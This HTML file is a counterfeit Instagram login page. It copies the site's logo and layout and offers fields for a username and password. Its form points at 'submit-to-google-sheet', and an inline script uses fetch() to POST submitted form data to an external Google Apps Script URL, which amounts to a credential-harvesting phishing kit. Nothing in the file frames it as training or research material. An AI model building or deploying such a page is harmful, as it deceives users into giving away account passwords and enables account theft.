<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
        }

        .login-container {
            max-width: 350px;
            width: 100%;
        }

        .login-form {
            background: #fff;
            border: 1px solid #dbdbdb;
            padding: 20px;
            margin-bottom: 10px;
            text-align: center;
        }

        .logo {
            margin: 20px 0;
        }

        .login-form input {
            width: 100%;
            padding: 10px;
            margin: 5px 0;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background: #fafafa;
        }

        .login-form button {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            background: #3897f0;
            border: none;
            border-radius: 3px;
            color: #fff;
            font-weight: bold;
            cursor: pointer;
        }

        .or-divider {
            display: flex;
            align-items: center;
            text-align: center;
            color: #8e8e8e;
            margin: 20px 0;
        }

        .or-divider span {
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }

        .or-divider span:nth-child(2) {
            flex: 0;
            margin: 0 10px;
        }

        .facebook-login {
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 20px 0;
        }

        .facebook-login img {
            width: 20px;
            margin-right: 10px;
        }

        .facebook-login a {
            color: #3897f0;
            font-weight: bold;
            text-decoration: none;
        }

        .forgot-password {
            color: #3897f0;
            font-size: 12px;
            text-decoration: none;
            margin-top: 10px;
        }

        .signup-container {
            background: #fff;
            border: 1px solid #dbdbdb;
            padding: 20px;
            text-align: center;
        }

        .signup-container p {
            font-size: 14px;
        }

        .signup-container a {
            color: #3897f0;
            font-weight: bold;
            text-decoration: none;
        }

        .get-app {
            text-align: center;
            margin: 20px 0;
        }

        .get-app p {
            font-size: 14px;
            margin-bottom: 10px;
        }

        .app-stores {
            display: flex;
            justify-content: center;
        }

        .app-stores img {
            width: 110px;
            margin: 0 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-container">
            <div class="login-form">
                <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram Logo" class="logo">
                <form action="submit-to-google-sheet">
                    <input type="text" name="username" placeholder="Phone number, username, or email" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit">Log In</button>
                    <div class="or-divider">
                        <span></span>
                        <span>OR</span>
                        <span></span>
                    </div>
                    <div class="facebook-login">
                        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
                        <a href="#">Log in with Facebook</a>
                    </div>
                    <a href="#" class="forgot-password">Forgot password?</a>
                </form>
            </div>
            <div class="signup-container">
                <p>Don't have an account? <a href="#">Sign up</a></p>
            </div>
            <div class="get-app">
                <p>Get the app.</p>
                <div class="app-stores">
                    <img src="googleplay.PNG" alt="Google Play">
                    <img src="microsoft.PNG" alt="Microsoft Store">
                </div>
            </div>
        </div>
    </div>
    
    <!-- Form for Google Sheets Submission -->
    <form name="submit-to-google-sheet">
        <input name="email" type="email" placeholder="Email" required>
        <button type="submit">Send</button>
    </form>
    
    <script>
        const scriptURL = 'https://script.google.com/macros/s/AKfycbx6bkaSfarOx9w1eO-4IuJsbEw6oo4lVpgCjam-Vk19w9vNF0009ddNf-g59ocUAHB7Qw/exec'
        const form = document.forms['submit-to-google-sheet']

        form.addEventListener('submit', e => {
            e.preventDefault()
            fetch(scriptURL, { method: 'POST', body: new FormData(form)})
                .then(response => {
                    console.log('Success!', response)
                    setTimeout(() => {
                        form.reset()
                        form.style.display = 'none'
                    }, 5)
                })
                .catch(error => console.error('Error!', error.message))
        })
    </script>
</body>
</html>
